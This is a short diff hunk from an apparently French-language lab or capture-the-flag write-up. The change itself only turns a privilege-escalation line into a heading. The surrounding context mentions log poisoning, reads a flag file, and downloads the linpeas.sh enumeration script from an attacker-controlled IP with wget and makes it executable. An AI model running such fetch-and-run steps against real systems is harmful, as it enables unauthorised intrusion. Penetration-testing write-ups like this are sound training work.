@@ -41,7 +41,7 @@ Par élimination, il reste donc les failles de type Log Poisoning à essayer. La
     cat /var/www/local.txt
 
 
-Élévation de privilèges toute simple avec un CVE : 
+### Élévation de privilèges classique avec un CVE : 
 
     wget http://192.168.45.231/linpeas.sh
     chmod u+x linpeas.sh
